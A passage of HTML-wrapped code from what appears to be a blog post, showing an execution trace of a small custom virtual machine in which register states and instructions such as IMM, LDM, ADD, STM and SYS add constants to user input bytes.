class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x140c6</span># <span class="hljs-number">40</span> : IMMb(<span class="hljs-number">1</span>) = c6<br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">2</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x80801</span># <span class="hljs-number">08</span> : stk<br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:c7 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x140c2</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c2 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:c8 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104005</span># <span class="hljs-number">40</span> : IMM c(<span class="hljs-number">0</span>x10) = <span class="hljs-number">05</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:c9 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404001</span># <span class="hljs-number">40</span> : IMM a(<span class="hljs-number">0</span>x40) = <span class="hljs-number">0</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:ca f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x48002</span># <span class="hljs-number">80</span> :SYS<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">0</span> i:cb f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">1</span> i:cc f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">2</span> i:cd f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x810</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:ce f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:cf f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104022</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">22</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:d0 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">22</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:d1 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x18002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">22</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:d2 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">2</span> i:d3 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">1</span> i:d4 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d5 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x84002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">3</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">1</span> i:<span class="hljs-number">4</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">2</span> i:<span class="hljs-number">5</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x810</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040fe</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:c2 c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span># <span class="hljs-number">01</span> : LDM b = *a<br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">9</span>e c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span># <span class="hljs-number">10</span> : ADD b c<br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">9</span>c c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span># <span class="hljs-number">02</span> : STM a = *ba1[<span class="hljs-number">0</span>x30] = user1 + <span class="hljs-number">0</span>xfe <br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">9</span>c c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404031</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:<span class="hljs-number">9</span>c c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10409b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:<span class="hljs-number">9</span>c c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:<span class="hljs-number">1</span>f c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:ba c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span># <span class="hljs-number">02</span> : STM a = *ba1[<span class="hljs-number">0</span>x31] = user2 + <span class="hljs-number">0</span>x9b<br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:ba c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">10</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404032</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:ba c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">11</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10403c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:ba c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">12</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:<span class="hljs-number">8</span>b c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">13</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:c7 c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">14</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:c7 c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">15</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404033</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:c7 c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">16</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040cc</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:c7 c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">17</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:<span class="hljs-number">5</span>b c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">18</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:<span class="hljs-number">27</span> c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">19</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:<span class="hljs-number">27</span> c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404034</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:<span class="hljs-number">27</span> c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040e3</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:<span class="hljs-number">27</span> c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:dc c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:bf c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:bf c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404035</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:bf c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">20</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040b0</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:bf c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">21</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:<span class="hljs-number">49</span> c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">22</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:f9 c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">23</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:f9 c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">24</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404036</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:f9 c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">25</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10401e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:f9 c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">26</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:<span class="hljs-number">55</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">27</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:<span class="hljs-number">73</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">28</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:<span class="hljs-number">73</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">29</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404037</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">73</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040e6</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">73</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">62</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">48</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">48</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404038</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">48</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104088</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">48</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">30</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">88</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">31</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">32</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">33</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404039</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">34</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104012</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">35</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">12</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">36</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">24</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">37</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">24</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">38</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">24</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">39</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040a1</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">24</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">97</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">38</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">38</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:<span class="hljs-number">38</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040d3</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:<span class="hljs-number">38</span> c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:<span class="hljs-number">15</span> c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">40</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:e8 c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">41</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:e8 c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">42</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:e8 c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">43</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040c3</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:e8 c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">44</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:<span class="hljs-number">48</span> c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">45</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:b c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">46</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:b c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">47</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:b c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">48</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:b c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">49</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:a3 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:a5 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:a5 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:a5 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040b2</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:a5 c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:<span class="hljs-number">48</span> c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:fa c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">50</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:fa c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">51</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403f</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:fa c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">52</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040df</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:fa c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">53</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:<span class="hljs-number">91</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">54</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:<span class="hljs-number">70</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">55</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:<span class="hljs-number">70</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">56</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:<span class="hljs-number">70</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">57</span> f:<span 